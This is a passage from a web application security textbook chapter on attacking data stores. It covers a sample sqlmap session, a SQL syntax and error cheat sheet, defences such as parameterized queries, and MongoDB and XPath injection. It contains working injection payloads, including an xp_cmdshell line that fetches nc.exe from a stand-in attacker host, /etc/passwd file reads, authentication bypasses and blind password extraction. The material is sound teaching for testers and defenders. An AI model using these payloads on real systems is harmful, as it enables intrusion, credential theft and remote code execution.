to decrease the number of necessary queries in an inference-based\nbrute-force attack, evade potential fi lters on single quotes, and more.\nNOTE These tools are primarily exploitation tools, best suited to extracting\ndata from the database by exploiting an injection point that you have already\nidentifi ed and understood. They are not a magic bullet for fi nding and exploit-\ning SQL injection fl aws. In practice, it is often necessary to provide some\nadditional SQL syntax before and/or after the data injected by the tool for the\ntool’s hard-coded attacks to work.\n\nHACK STEPS\nWhen you have identifi ed a SQL injection vulnerability, using the techniques\ndescribed earlier in this chapter, you can consider using a SQL injection tool to\nexploit the vulnerability and retrieve interesting data from the database. This\noption is particularly useful in cases where you need to use blind techniques\nto retrieve a small amount of data at a time.\n1. Run the SQL exploitation tool using an intercepting proxy. Analyze the\nrequests made by the tool as well as the application’s responses. Turn on\nany verbose output options on the tool, and correlate its progress with the\nobserved queries and responses.\nContinued\ncc0099..iinndddd 332299 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 330\n330 Chapter 9 n Attacking Data Stores\nHACK STEPS (CONTINUED)\n2. Because these kinds of tools rely on preset tests and specific response\nsyntax, it may be necessary to append or prepend data to the string\ninjected by the tool to ensure that the tool gets the expected response.\nTypical requirements are adding a comment character, balancing the\nsingle quotes within the server’s SQL query, and appending or prepending\nclosing brackets to the string to match the original query.\n3. If the syntax appears to be failing regardless of the methods described\nhere, it is often easiest to create a nested subquery that is fully under\nyour control, and allow the tool to inject into that. This allows the tool to\nuse inference to extract data. Nested queries work well when you inject\ninto standard SELECT and UPDATE queries. Under Oracle they work within\nanINSERT statement. In each of the following cases, prepend the text\noccurring before [input], and append the closing bracket occurring after\nthat point:\nn Oracle: ‘||(select 1 from dual where 1=[input])\nn MS-SQL: (select 1 where 1=[input])\nNumerous tools exist for automated exploitation of SQL injection. Many of\nthese are specifi cally geared toward MS-SQL, and many have ceased active\ndevelopment and have been overtaken by new techniques and developments in\nSQL injection. The authors’ favorite is sqlmap, which can attack MySQL, Oracle,\nand MS-SQL, among others. It implements UNION-based and inference-based\nretrieval. It supports various escalation methods, including retrieval of fi les\nfrom the operating system, and command execution under Windows using\nxp_cmdshell.\nIn practice, sqlmap is an effective tool for database information retrieval\nthrough time-delay or other inference methods and can be useful for UNION-\nbased retrieval. One of the best ways to use it is with the --sql-shell option.\nThis gives the attacker a SQL prompt and performs the necessary UNION, error-\nbased, or blind SQL injection behind the scenes to send and retrieve results.\nFor example:\nC:\\sqlmap>sqlmap.py -u http://wahh-app.com/employees?Empno=7369 --union-use\n--sql-shell -p Empno\nsqlmap/0.8 - automatic SQL injection and database takeover tool\nhttp://sqlmap.sourceforge.net\n[*] starting at: 14:54:39\n[14:54:39] [INFO] using ‘C:\\sqlmap\\output\\wahh-app.com\\session’\nas session file\n[14:54:39] [INFO] testing connection to the target url\n[14:54:40] [WARNING] the testable parameter ‘Empno’ you provided is not\ncc0099..iinndddd 333300 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 331\nChapter 9 n Attacking Data Stores 331\ninto the\nCookie\n[14:54:40] [INFO] testing if the url is stable, wait a few seconds\n[14:54:44] [INFO] url is stable\n[14:54:44] [INFO] testing sql injection on GET parameter ‘Empno’ with 0\nparenthesis\n[14:54:44] [INFO] testing unescaped numeric injection on GET parameter\n‘Empno’\n[14:54:46] [INFO] confirming unescaped numeric injection on GET\nparameter ‘Empno’\n[14:54:47] [INFO] GET parameter ‘Empno’ is unescaped numeric injectable\nwith 0\nparenthesis\n[14:54:47] [INFO] testing for parenthesis on injectable parameter\n[14:54:50] [INFO] the injectable parameter requires 0 parenthesis\n[14:54:50] [INFO] testing MySQL\n[14:54:51] [WARNING] the back-end DMBS is not MySQL\n[14:54:51] [INFO] testing Oracle\n[14:54:52] [INFO] confirming Oracle\n[14:54:53] [INFO] the back-end DBMS is Oracle\nweb server operating system: Windows 2000\nweb application technology: ASP, Microsoft IIS 5.0\nback-end DBMS: Oracle\n[14:54:53] [INFO] testing inband sql injection on parameter ‘Empno’ with\n\nNULL\nbruteforcing technique\n[14:54:58] [INFO] confirming full inband sql injection on parameter\n‘Empno’\n[14:55:00] [INFO] the target url is affected by an exploitable full\ninband\nsql injection vulnerability\nvalid union: ‘http://wahh-app.com:80/employees.asp?Empno=7369%20\nUNION%20ALL%20SEL\nECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20DUAL--%20AND%20\n3663=3663’\n[14:55:00] [INFO] calling Oracle shell. To quit type ‘x’ or ‘q’ and\npress ENTER\nsql-shell> select banner from v$version\ndo you want to retrieve the SQL statement output? [Y/n]\n[14:55:19] [INFO] fetching SQL SELECT statement query output: ‘select banner\nfrom v$version’\nselect banner from v$version [5]:\n[*] CORE 9.2.0.1.0 Production\n[*] NLSRTL Version 9.2.0.1.0 - Production\n[*] Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production\n[*] PL/SQL Release 9.2.0.1.0 - Production\n[*] TNS for 32-bit Windows: Version 9.2.0.1.0 - Production\nsql-shell>\ncc0099..iinndddd 333311 88//1199//22001111 1122::0099::3322 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 332\n332 Chapter 9 n Attacking Data Stores\nSQL Syntax and Error Reference\nWe have described numerous techniques that enable you to probe for and\nexploit SQL injection vulnerabilities in web applications. In many cases, there\nare minor differences between the syntax that you need to employ against\ndifferent back-end database platforms. Furthermore, every database produces\ndifferent error messages whose meaning you need to understand both when\nprobing for fl aws and when attempting to craft an effective exploit. The fol-\nlowing pages contain a brief cheat sheet that you can use to look up the exact\nsyntax you need for a particular task and to decipher any unfamiliar error\nmessages you encounter.\nSQL Syntax\nRequirement: ASCII and SUBSTRING\nOracle: ASCII(‘A’) is equal to 65\nSUBSTR(‘ABCDE’,2,3) is equal to BCD\nMS-SQL: ASCII(‘A’) is equal to 65\nSUBSTRING(‘ABCDE’,2,3) is equal to BCD\nMySQL: ASCII(‘A’) is equal to 65\nSUBSTRING(‘ABCDE’,2,3) is equal to BCD\nRequirement: Retrieve current database user\nOracle: Select Sys.login_user from dual SELECT\nuser FROM dual SYS_CONTEXT(‘USERENV’,\n‘SESSION_USER’)\nMS-SQL: select suser_sname()\nMySQL: SELECT user()\nRequirement: Cause a time delay\nOracle: Utl_Http.request(‘http://madeupserver.com’)\nMS-SQL: waitfor delay ‘0:0:10’\nexec master..xp_cmdshell ‘ping localhost’\nMySQL: sleep(100)\ncc0099..iinndddd 333322 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 333\nChapter 9 n Attacking Data Stores 333\nRequirement: Retrieve database version string\nOracle: select banner from v$version\nMS-SQL: select @@version\nMySQL: select @@version\nRequirement: Retrieve current database\nOracle: SELECT SYS_CONTEXT(‘USERENV’,’DB_NAME’) FROM dual\nMS-SQL: SELECT db_name()\nThe server name can be retrieved using:\nSELECT @@servername\nMySQL: SELECT database()\nRequirement: Retrieve current user’s privilege\nOracle: SELECT privilege FROM session_privs\nMS-SQL: SELECT grantee, table_name, privilege_type FROM\nINFORMATION_SCHEMA.TABLE_PRIVILEGES\nMySQL: S ELECT * FROM information_schema.user_privileges\nWHERE grantee = ‘[user]’ where [user] is determined\nfrom the output of SELECT user()\nRequirement: Show all tables and columns in a single column of results\nOracle: Select table_name||’\n‘||column_name from all_tab_columns\nMS-SQL: SELECT table_name+’\n‘+column_name from information_schema.columns\nMySQL: SELECT CONCAT(table_name,\n‘,column_name) from information_schema.columns\nRequirement: Show user objects\nOracle: SELECT object_name, object_type FROM user_objects\nMS-SQL: SELECT name FROM sysobjects\nMySQL: S ELECT table_name FROM information_schema.tables\n(or trigger_name from information_schema.triggers, etc.)\nContinued\ncc0099..iinndddd 333333 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 334\n334 Chapter 9 n Attacking Data Stores\n(continued)\nRequirement: Show user tables\nOracle: SELECT object_name, object_type FROM user_objects\nWHERE object_type=’TABLE’\nOr to show all tables to which the user has access:\nSELECT table_name FROM all_tables\nMS-SQL: SELECT name FROM sysobjects WHERE xtype=’U’\nMySQL: SELECT table_name FROM information_schema.\ntables where table_type=’BASE TABLE’ and\ntable_schema!=’mysql’\nRequirement: Show column names for table foo\nOracle: SELECT column_name, name FROM user_tab_columns\nWHERE table_name = ‘FOO’\nUse the ALL_tab_columns table if the target data is not owned\nby the current application user.\nMS-SQL: SELECT column_name FROM information_schema.columns\nWHERE table_name=’foo’\nMySQL: SELECT column_name FROM information_schema.columns\nWHERE table_name=’foo’\nRequirement: Interact with the operating system (simplest ways)\nOracle: See TheOracleHacker’sHandbook by David Litchfi eld\nMS-SQL: EXEC xp_cmshell ‘dir c:\\ ‘\nMySQL: SELECT load_file(‘/etc/passwd’)\nSQL Error Messages\nOracle: ORA-01756: quoted string not properly terminated\nORA-00933: SQL command not properly ended\nMS-SQL: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near ‘foo’\nMsg 105, Level 15, State 1, Line 1\nUnclosed quotation mark before the character string\n‘foo’\ncc0099..iinndddd 333344 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 335\nChapter 9 n Attacking Data Stores 335\nMySQL: You have an error in your SQL syntax. Check the man-\nual that corresponds to your MySQL server version\nfor the right syntax to use near ‘’foo’ at line X\nTranslation: For Oracle and MS-SQL, SQL injection is present, and it is almost\ncertainly exploitable! If you entered a single quote and it altered\nthe syntax of the database query, this is the error you’d expect. For\nMySQL, SQL injection may be present, but the same error message\ncan appear in other contexts.\nOracle: PLS-00306: wrong number or types of arguments in\ncall to ‘XXX’\nMS-SQL: Procedure ‘XXX’ expects parameter ‘@YYY’, which was\nnot supplied\nMySQL: N/A\nTranslation: You have commented out or removed a variable that normally would\nbe supplied to the database. In MS-SQL, you should be able to use\ntime delay techniques to perform arbitrary data retrieval.\nOracle: ORA-01789: query block has incorrect number of\nresult columns\nMS-SQL: Msg 205, Level 16, State 1, Line 1\nAll queries in a SQL statement containing a UNION\noperator must have an equal number of expressions in\ntheir target lists.\nMySQL: The used SELECT statements have a different number\nof columns\nTranslation: You will see this when you are attempting a UNION SELECT attack,\nand you have specifi ed a different number of columns to the number\nin the original SELECT statement.\nOracle: ORA-01790: expression must have same datatype as\ncorresponding expression\nMS-SQL: Msg 245, Level 16, State 1, Line 1\nSyntax error converting the varchar value ‘foo’ to a\ncolumn of data type int.\nMySQL: (MySQL will not give you an error.)\nTranslation: You will see this when you are attempting a UNION SELECT attack,\nand you have specifi ed a different data type from that found in the\noriginal SELECT statement. Try using a NULL, or using 1 or 2000.\nContinued\ncc0099..iinndddd 333355 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 336\n336 Chapter 9 n Attacking Data Stores\n(continued)\nOracle: ORA-01722: invalid number\nORA-01858: a non-numeric character was found where a\nnumeric was expected\nMS-SQL: Msg 245, Level 16, State 1, Line 1\nSyntax error converting the varchar value ‘foo’ to a\ncolumn of data type int.\nMySQL: (MySQL will not give you an error.)\nTranslation: Your input doesn’t match the expected data type for the fi eld. You\nmay have SQL injection, and you may not need a single quote, so\ntry simply entering a number followed by your SQL to be injected. In\nMS-SQL, you should be able to return any string value with this error\nmessage.\nOracle: ORA-00923: FROM keyword not found where expected\nMS-SQL: N/A\nMySQL: N/A\nTranslation: The following will work in MS-SQL:\n\nSELECT 1\nBut in Oracle, if you want to return something, you must select from\na table. The DUAL table will do fi ne:\nSELECT 1 from DUAL\nOracle: ORA-00936: missing expression\nMS-SQL: Msg 156, Level 15, State 1, Line 1Incorrect syntax\nnear the keyword ‘from’.\nMySQL: You have an error in your SQL syntax. Check the\nmanual that corresponds to your MySQL server version\nfor the right syntax to use near ‘ XXX , YYY from\nSOME_TABLE’ at line 1\nTranslation: You commonly see this error message when your injection point\noccurs before the FROM keyword (for example, you have injected\ninto the columns to be returned) and/or you have used the com-\nment character to remove required SQL keywords. Try completing the\nSQL statement yourself while using your comment character. MySQL\nshould helpfully reveal the column names XXX, YYY when this condi-\ntion is encountered.\ncc0099..iinndddd 333366 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 337\nChapter 9 n Attacking Data Stores 337\nOracle: ORA-00972:identifier is too long\nMS-SQL: String or binary data would be truncated.\nMySQL: N/A\nTranslation: This does not indicate SQL injection. You may see this error message\nif you have entered a long string. You’re unlikely to get a buffer over-\nfl ow here either, because the database is handling your input safely.\nOracle: ORA-00942: table or view does not exist\nMS-SQL: Msg 208, Level 16, State 1, Line 1\nInvalid object name ‘foo’\nMySQL: Table ‘DBNAME.SOMETABLE’ doesn’t exist\nTranslation: Either you are trying to access a table or view that does not exist, or,\nin the case of Oracle, the database user does not have privileges for\nthe table or view. Test your query against a table you know you have\naccess to, such as DUAL. MySQL should helpfully reveal the current\ndatabase schema DBNAME when this condition is encountered.\nOracle: ORA-00920: invalid relational operator\nMS-SQL: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near foo\nMySQL: You have an error in your SQL syntax. Check the\nmanual that corresponds to your MySQL server version\nfor the right syntax to use near ‘’ at line 1\nTranslation: You were probably altering something in a WHERE clause, and your\nSQL injection attempt has disrupted the grammar.\nOracle: ORA-00907: missing right parenthesis\nMS-SQL: N/A\nMySQL: You have an error in your SQL syntax. Check the\nmanual that corresponds to your MySQL server version\nfor the right syntax to use near ‘’ at line 1\nTranslation: Your SQL injection attempt has worked, but the injection point was\ninside parentheses. You probably commented out the closing paren-\nthesis with injected comment characters (--).\nContinued\ncc0099..iinndddd 333377 88//1199//22001111 1122::0099::3333 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 338\n338 Chapter 9 n Attacking Data Stores\n(continued)\nOracle: ORA-00900: invalid SQL statement\nMS-SQL: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near foo\nMySQL: You have an error in your SQL syntax. Check the\nmanual that corresponds to your MySQL server version\nfor the right syntax to use near XXXXXX\nTranslation: A general error message. The error messages listed previously all take\nprecedence, so something else went wrong. It’s likely you can try\nalternative input and get a more meaningful message.\nOracle: ORA-03001: unimplemented feature\nMS-SQL: N/A\nMySQL: N/A\nTranslation: You have tried to perform an action that Oracle does not allow. This\ncan happen if you were trying to display the database version string\nfrom v$version but you were in an UPDATE or INSERT query.\nOracle: ORA-02030: can only select from fixed tables/views\nMS-SQL: N/A\nMySQL: N/A\nTranslation: You were probably trying to edit a SYSTEM view. This can hap-\npen if you were trying to display the database version string from\nv$version but you were in an UPDATE or INSERT query.\nPreventing SQL Injection\nDespite all its different manifestations, and the complexities that can arise in its\nexploitation, SQL injection is in general one of the easier vulnerabilities to prevent.\nNevertheless, discussion about SQL injection countermeasures is frequently mislead-\ning, and many people rely on defensive measures that are only partially effective.\nPartially Effective Measures\nBecause of the prominence of the single quotation mark in the standard expla-\nnations of SQL injection fl aws, a common approach to preventing attacks is to\nescape any single quotation marks within user input by doubling them. You\nhave already seen two situations in which this approach fails:\nn If numeric user-supplied data is being embedded into SQL queries, this\nis not usually encapsulated within single quotation marks. Hence, an\ncc0099..iinndddd 333388 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 339\nChapter 9 n Attacking Data Stores 339\nattacker can break out of the data context and begin entering arbitrary\nSQL without the need to supply a single quotation mark.\nn In second-order SQL injection attacks, data that has been safely escaped\nwhen initially inserted into the database is subsequently read from the\ndatabase and then passed back to it again. Quotation marks that were\ndoubled initially return to their original form when the data is reused.\nAnother countermeasure that is often cited is the use of stored procedures\nfor all database access. There is no doubt that custom stored procedures can\nprovide security and performance benefi ts. However, they are not guaranteed\nto prevent SQL injection vulnerabilities for two reasons:\nn As you saw in the case of Oracle, a poorly written stored procedure can\ncontain SQL injection vulnerabilities within its own code. Similar security\nissues arise when constructing SQL statements within stored procedures\nas arise elsewhere. The fact that a stored procedure is being used does\nnot prevent fl aws from occurring.\nn Even if a robust stored procedure is being used, SQL injection vulnerabili-\nties can arise if it is invoked in an unsafe way using user-supplied input.\nFor example, suppose that a user registration function is implemented\nwithin a stored procedure, which is invoked as follows:\nexec sp_RegisterUser ‘joe’, ‘secret’\nThis statement may be just as vulnerable as a simple INSERT statement.\nFor example, an attacker may supply the following password:\nfoo’; exec master..xp_cmdshell ‘tftp wahh-attacker.com GET nc.exe’--\nwhich causes the application to perform the following batch query:\nexec sp_RegisterUser ‘joe’, ‘foo’; exec master..xp_cmdshell ‘tftp\nwahh-attacker.com GET nc.exe’--’\nTherefore, the use of the stored procedure has achieved nothing.\nIn fact, in a large and complex application that performs thousands of different\nSQL statements, many developers regard the solution of reimplementing these state-\nments as stored procedures to be an unjustifi able overhead on development time.\nParameterized Queries\nMost databases and application development platforms provide APIs for handling\nuntrusted input in a secure way, which prevents SQL injection vulnerabilities\nfrom arising. In parameterized queries (also known as preparedstatements), the\nconstruction of a SQL statement containing user input is performed in two steps:\n1. The application specifi es the query’s structure, leaving placeholders for\neach item of user input.\n2. The application specifi es the contents of each placeholder.\ncc0099..iinndddd 333399 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 340\n340 Chapter 9 n Attacking Data Stores\nCrucially, there is no way in which crafted data that is specifi ed at the\nsecond step can interfere with the structure of the query specifi ed in the fi rst\nstep. Because the query structure has already been defi ned, the relevant API\nhandles any type of placeholder data in a safe manner, so it is always interpreted\nas data rather than part of the statement’s structure.\nThe following two code samples illustrate the difference between an unsafe\nquery dynamically constructed from user data and its safe parameterized coun-\nterpart. In the fi rst, the user-supplied name parameter is embedded directly into\na SQL statement, leaving the application vulnerable to SQL injection:\n//define the query structure\nString queryText = “select ename,sal from emp where ename =’”;\n//concatenate the user-supplied name\nqueryText += request.getParameter(“name”);\nqueryText += “’”;\n// execute the query\nstmt = con.createStatement();\nrs = stmt.executeQuery(queryText);\nIn the second example, the query structure is defi ned using a question mark as\na placeholder for the user-supplied parameter. The prepareStatement method is\ninvoked to interpret this and fi x the structure of the query that is to be executed.\nOnly then is the setString method used to specify the parameter’s actual value.\nBecause the query’s structure has already been fi xed, this value can contain any\ndata without affecting the structure. The query is then executed safely:\n//define the query structure\nString queryText = “SELECT ename,sal FROM EMP WHERE ename = ?”;\n//prepare the statement through DB connection “con”\nstmt = con.prepareStatement(queryText);\n//add the user input to variable 1 (at the first ? placeholder)\nstmt.setString(1, request.getParameter(“name”));\n// execute the query\nrs = stmt.executeQuery();\nNOTE The precise methods and syntax for creating parameterized queries dif-\nfer among databases and application development platforms. See Chapter 18\nfor more details about the most common examples.\ncc0099..iinndddd 334400 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 341\nChapter 9 n Attacking Data Stores 341\nIf parameterized queries are to be an effective solution against SQL injection,\nyou need to keep in mind several important provisos:\nn They should be used for every database query. The authors have encoun-\ntered many applications where the developers made a judgment in each\ncase about whether to use a parameterized query. In cases where user-\nsupplied input was clearly being used, they did so; otherwise, they didn’t\nbother. This approach has been the cause of many SQL injection fl aws.\nFirst, by focusing only on input that has been immediately received from\nthe user, it is easy to overlook second-order attacks, because data that\nhas already been processed is assumed to be trusted. Second, it is easy to\nmake mistakes about the specifi c cases in which the data being handled\nis user-controllable. In a large application, different items of data are\nheld within the session or received from the client. Assumptions made\nby one developer may not be communicated to others. The handling of\nspecifi c data items may change in the future, introducing a SQL injection\nfl aw into previously safe queries. It is much safer to take the approach of\nmandating the use of parameterized queries throughout the application.\nn Every item of data inserted into the query should be properly para meterized.\nThe authors have encountered numerous cases where most of a query’s\nparameters are handled safely, but one or two items are concatenated\ndirectly into the string used to specify the query structure. The use of\nparameterized queries will not prevent SQL injection if some parameters\nare handled in this way.\nn Parameter placeholders cannot be used to specify the table and column\nnames used in the query. In some rare cases, applications need to specify\nthese items within a SQL query on the basis of user-supplied data. In this\nsituation, the best approach is to use a white list of known good values\n(the list of tables and columns actually used within the database) and to\nreject any input that does not match an item on this list. Failing this, strict\nvalidation should be enforced on the user input — for example, allow-\ning only alphanumeric characters, excluding whitespace, and enforcing\na suitable length limit.\nn Parameter placeholders cannot be used for any other parts of the query,\nsuch as the ASC or DESC keywords that appear within an ORDER BY clause,\nor any other SQL keyword, since these form part of the query structure.\nAs with table and column names, if it is necessary for these items to be\nspecifi ed based on user-supplied data, rigorous white list validation should\nbe applied to prevent attacks.\ncc0099..iinndddd 334411 88//1199//22001111 1122::0099::3333 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 342\n342 Chapter 9 n Attacking Data Stores\nDefense in Depth\nAs always, a robust approach to security should employ defense-in-depth\nmeasures to provide additional protection in the event that frontline defenses\nfail for any reason. In the context of attacks against back-end databases, three\nlayers of further defense can be employed:\nn The application should use the lowest possible level of privileges when\naccessing the database. In general, the application does not need DBA-\nlevel permissions. It usually only needs to read and write its own data. In\nsecurity-critical situations, the application may employ a different database\naccount for performing different actions. For example, if 90 percent of its\ndatabase queries require only read access, these can be performed using\nan account that does not have write privileges. If a particular query needs\nto read only a subset of data (for example, the orders table but not the\nuser accounts table), an account with the corresponding level of access\ncan be used. If this approach is enforced throughout the application, any\nresidual SQL injection fl aws that may exist are likely to have their impact\nsignifi cantly reduced.\nn Many enterprise databases include a huge amount of default functional-\nity that can be leveraged by an attacker who gains the ability to execute\narbitrary SQL statements. Wherever possible, unnecessary functions\nshould be removed or disabled. Even though there are cases where a\nskilled and determined attacker may be able to recreate some required\nfunctions through other means, this task is not usually straightforward,\nand the database hardening will still place signifi cant obstacles in the\nattacker’s path.\nn All vendor-issued security patches should be evaluated, tested, and applied\nin a timely way to fi x known vulnerabilities within the database software\nitself. In security-critical situations, database administrators can use various\nsubscriber-based services to obtain advance notifi cation of some known\nvulnerabilities that have not yet been patched by the vendor. They can\nimplement appropriate work-around measures in the interim.\nInjecting into NoSQL\nThe term NoSQL is used to refer to various data stores that break from stan-\ndard relational database architectures. NoSQL data stores represent data using\nkey/value mappings and do not rely on a fi xed schema such as a conventional\ndatabase table. Keys and values can be arbitrarily defi ned, and the format of\nthe value generally is not relevant to the data store. A further feature of key/\nvalue storage is that a value may be a data structure itself, allowing hierarchical\nstorage, unlike the fl at data structure inside a database schema.\ncc0099..iinndddd 334422 88//1199//22001111 1122::0099::3333 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 343\nChapter 9 n Attacking Data Stores 343\nNoSQL advocates claim this has several advantages, mainly in handling very\nlarge data sets, where the data store’s hierarchical structure can be optimized\nexactly as required to reduce the overhead in retrieving data sets. In these\ninstances a conventional database may require complex cross-referencing of\ntables to retrieve information on behalf of an application.\nFrom a web application security perspective, the key consideration is how\nthe application queries data, because this determines what forms of injection\nare possible. In the case of SQL injection, the SQL language is broadly similar\nacross different database products. NoSQL, by contrast, is a name given to a\ndisparate range of data stores, all with their own behaviors. They don’t all use\na single query language.\nHere are some of the common query methods used by NoSQL data stores:\nn Key/value lookup\nn XPath (described later in this chapter)\nn Programming languages such as JavaScript\nNoSQL is a relatively new technology that has evolved rapidly. It has not\nbeen deployed on anything like the scale of more mature technologies such as\nSQL. Hence, research into NoSQL-related vulnerabilities is still in its infancy.\nFurthermore, due to the inherently simple means by which many NoSQL imple-\nmentations allow access to data, examples sometimes discussed of injecting into\nNoSQL data stores can appear contrived.\nIt is almost certain that exploitable vulnerabilities will arise in how NoSQL\ndata stores are used in today’s and tomorrow’s web applications. One such\nexample, derived from a real-world application, is described in the next section.\nInjecting into MongoDB\nMany NoSQL databases make use of existing programming languages to pro-\nvide a fl exible, programmable query mechanism. If queries are built using\nstring concatenation, an attacker can attempt to break out of the data context\nand alter the query’s syntax. Consider the following example, which performs\na login based on user records in a MongoDB data store:\n$m = new Mongo();\n$db = $m->cmsdb;\n$collection = $db->user;\n$js = “function() {\nreturn this.username == ‘$username’ & this.password == ‘$password’; }”;\n$obj = $collection->findOne(array(‘$where’ => $js));\nif (isset($obj[“uid”]))\n{\n$logged_in=1;\ncc0099..iinndddd 334433 88//1199//22001111 1122::0099::3333 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 344\n344 Chapter 9 n Attacking Data Stores\n}\nelse\n{\n$logged_in=0;\n}\n$js is a JavaScript function, the code for which is constructed dynamically\nand includes the user-supplied username and password. An attacker can bypass\nthe authentication logic by supplying a username:\nMarcus’//\nand any password. The resulting JavaScript function looks like this:\nfunction() { return this.username == ‘Marcus’//’ & this.password == ‘aaa’; }\nNOTE In JavaScript, a double forward slash (//) signifi es a rest-of-line com-\nment, so the remaining code in the function is commented out.\nAn alternative means of ensuring that the $js function always returns\ntrue, without using a comment, would be to supply a username of:\na’ || 1==1 || ‘a’==’a\nJavaScript interprets the various operators like this:\n(this.username == ‘a’ || 1==1) || (‘a’==’a’ & this.password ==\n‘aaa’);\nThis results in all of the resources in the user collection being matched,\nsince the fi rst disjunctive condition is always true (1 is always equal to 1).\nInjecting into XPath\nThe XML Path Language (XPath) is an interpreted language used to navigate\naround XML documents and to retrieve data from within them. In most cases,\nan XPath expression represents a sequence of steps that is required to navigate\nfrom one node of a document to another.\nWhere web applications store data within XML documents, they may use\nXPath to access the data in response to user-supplied input. If this input is\ninserted into the XPath query without any fi ltering or sanitization, an attacker\nmay be able to manipulate the query to interfere with the application’s logic or\nretrieve data for which she is not authorized.\nXML documents generally are not a preferred vehicle for storing enterprise data.\nHowever, they are frequently used to store application confi guration data that may\nbe retrieved on the basis of user input. They may also be used by smaller applica-\ntions to persist simple information such as user credentials, roles, and privileges.\ncc0099..iinndddd 334444 88//1199//22001111 1122::0099::3344 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 345\nChapter 9 n Attacking Data Stores 345\nConsider the following XML data store:\n<addressBook>\n<address>\n<firstName>William</firstName>\n<surname>Gates</surname>\n<password>MSRocks!</password>\n<email>billyg@microsoft.com</email>\n<ccard>5130 8190 3282 3515</ccard>\n</address>\n<address>\n<firstName>Chris</firstName>\n<surname>Dawes</surname>\n<password>secret</password>\n<email>cdawes@craftnet.de</email>\n<ccard>3981 2491 3242 3121</ccard>\n</address>\n<address>\n<firstName>James</firstName>\n<surname>Hunter</surname>\n<password>letmein</password>\n<email>james.hunter@pookmail.com</email>\n<ccard>8113 5320 8014 3313</ccard>\n</address>\n</addressBook>\nAn XPath query to retrieve all e-mail addresses would look like this:\n//address/email/text()\nA query to return all the details of the user Dawes would look like this:\n//address[surname/text()=’Dawes’]\nIn some applications, user-supplied data may be embedded directly into\nXPath queries, and the results of the query may be returned in the application’s\nresponse or used to determine some aspect of the application’s behavior.\nSubverting Application Logic\nConsider an application function that retrieves a user’s stored credit card num-\nber based on a username and password. The following XPath query effectively\nverifi es the user-supplied credentials and retrieves the relevant user’s credit\ncard number:\n//address[surname/text()=’Dawes’ and password/text()=’secret’]/ccard/\ntext()\ncc0099..iinndddd 334455 88//1199//22001111 1122::0099::3344 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 346\n346 Chapter 9 n Attacking Data Stores\nIn this case, an attacker may be able to subvert the application’s query in an\nidentical way to a SQL injection fl aw. For example, supplying a password with\nthis value:\n‘ or ‘a’=’a\nresults in the following XPath query, which retrieves the credit card details of\nall users:\n//address[surname/text()=’Dawes’ and password/text()=’’ or ‘a’=’a’]/\nccard/text()\n\nNOTE\nn As with SQL injection, single quotation marks are not required when\ninjecting into a numeric value.\nn Unlike SQL queries, keywords in XPath queries are case-sensitive, as are\nthe element names in the XML document itself.\nInformed XPath Injection\nXPath injection fl aws can be exploited to retrieve arbitrary information from\nwithin the target XML document. One reliable way of doing this uses the same\ntechnique as was described for SQL injection, of causing the application to\nrespond in different ways, contingent on a condition specifi ed by the attacker.\nSubmitting the following two passwords will result in different behavior\nby the application. Results are returned in the fi rst case but not in the second:\n‘ or 1=1 and ‘a’=’a\n‘ or 1=2 and ‘a’=’a\nThis difference in behavior can be leveraged to test the truth of any specifi ed\ncondition and, therefore, extract arbitrary information one byte at a time. As\nwith SQL, the XPath language contains a substring function that can be used\nto test the value of a string one character at a time. For example, supplying this\npassword:\n‘ or //address[surname/text()=’Gates’ and substring(password/text(),1,1)=\n‘M’] and ‘a’=’a\nresults in the following XPath query, which returns results if the fi rst character\nof the Gates user’s password is M:\n//address[surname/text()=’Dawes’ and password/text()=’’ or\n//address[surname/text()=’Gates’ and substring(password/text(),1,1)= ‘M’]\nand ‘a’=’a ‘]/ccard/text()\ncc0099..iinndddd 334466 88//1199//22001111 1122::0099::3344 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 347\nChapter 9 n Attacking Data Stores 347\nBy cycling through each character position and testing each possible value,\nan attacker can extract the full value of Gates’ password.\nTRY IT!\nhttp://mdsec.net/cclookup/14/\nBlind XPath Injection\nIn the attack just described, the injected test condition specifi ed both the absolute\npath to the extracted data (address) and the names of the targeted fi elds (surname\nand password). In fact, it is possible to mount a fully blind attack without pos-\nsessing this information. XPath queries can contain steps that are relative to the\ncurrent node within the XML document, so from the current node it is possible\nto navigate to the parent node or to a specifi c child node. Furthermore, XPath\ncontains functions to query meta-information about the document, including\nthe name of a specifi c element. Using these techniques, it is possible to extract\nthe names and values of all nodes within the document without knowing any\nprior information about its structure or contents.\nFor example, you can use the substring technique described previously to\nextract the name of the current node’s parent by supplying a series of passwords\nof this form:\n‘ or substring(name(parent::*[position()=1]),1,1)= ‘a\nThis input generates results, because the fi rst letter of the address node is a.\nMoving on to the second letter, you can confi rm that this is d by supplying the\nfollowing passwords, the last of which generates results:\n‘ or substring(name(parent::*[position()=1]),2,1)=’a\n‘ or substring(name(parent::*[position()=1]),2,1)=’b\n‘ or substring(name(parent::*[position()=1]),2,1)=’c\n‘ or substring(name(parent::*[position()=1]),2,1)=’d\nHaving established the 